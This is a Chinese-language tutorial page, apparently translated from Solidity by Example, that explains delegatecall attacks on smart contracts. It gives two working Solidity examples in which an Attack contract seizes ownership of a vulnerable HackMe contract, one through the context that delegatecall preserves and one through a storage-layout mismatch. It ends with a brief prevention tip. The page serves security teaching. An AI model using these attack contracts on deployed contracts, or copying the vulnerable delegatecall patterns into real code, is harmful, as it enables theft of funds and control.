# Delegatecall 攻击

对应英文原页：https://solidity-by-example.org/hacks/delegatecall

## 漏洞

`delegatecall` 很难正确使用，错误用法或错误理解
可能导致灾难性后果。

使用 `delegatecall` 时必须记住两点

1. `delegatecall` 会保留上下文（存储、调用者等）
2. 调用 `delegatecall` 的合约和被调用合约的存储布局必须相同

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
HackMe 是一个使用 delegatecall 执行代码的合约。
HackMe 内部没有可以更改 owner 的函数，因此这一点并不明显。
但攻击者可以利用 delegatecall 劫持合约。让我们看看如何做到。

1. Alice 部署 Lib
2. Alice 使用 Lib 的地址部署 HackMe
3. Eve 使用 HackMe 的地址部署 Attack
4. Eve 调用 Attack.attack()
5. Attack 现在是 HackMe 的 owner

发生了什么？
Eve 调用了 Attack.attack()。
Attack 调用了 HackMe 的 fallback 函数，并发送了
pwn() 的函数选择器。HackMe 使用 delegatecall 把调用转发给 Lib。
此时 msg.data 包含 pwn() 的函数选择器。
这会告诉 Solidity 去调用 Lib 内的 pwn() 函数。
pwn() 函数把 owner 更新为 msg.sender。
delegatecall 使用 HackMe 的上下文运行 Lib 的代码。
因此 HackMe 的存储被更新为 msg.sender，而这里的 msg.sender 是
HackMe 的调用者，也就是 Attack。
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```

这是另一个例子。

在理解这个漏洞之前，你需要先了解 Solidity 如何存储
状态变量。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
这是前一个漏洞的更复杂版本。

1. Alice 部署 Lib，并用 Lib 的地址部署 HackMe
2. Eve 使用 HackMe 的地址部署 Attack
3. Eve 调用 Attack.attack()
4. Attack 现在是 HackMe 的 owner

发生了什么？
注意 Lib 和 HackMe 中状态变量的定义方式并不相同。
这意味着调用 Lib.doSomething() 会改变 HackMe 中的第一个
状态变量，而它恰好是 lib 的地址。

在 attack() 内，第一次调用 doSomething() 改变了 HackMe 中存储的
lib 地址。现在 lib 的地址被设为 Attack。
第二次调用 doSomething() 会调用 Attack.doSomething()，我们在这里
更改 owner。
*/

contract Lib {
    uint256 public someNumber;

    function doSomething(uint256 _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint256 public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // 确保存储布局与 HackMe 相同
    // 这样我们才能正确更新状态变量
    address public lib;
    address public owner;
    uint256 public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // 覆盖 lib 的地址
        hackMe.doSomething(uint256(uint160(address(this))));
        // 传入任意数字，下面的 doSomething() 函数
        // 将被调用
        hackMe.doSomething(1);
    }

    // 函数签名必须与 HackMe.doSomething() 匹配
    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}
```

## 预防措施

- 使用无状态的 `Library`

---
## 关注我们
[Yanbo的Twitter](https://twitter.com/YanboOfficial)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)

加入Web3Club 官方讨论群：YanboTravelAllWorld（微信号）

[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
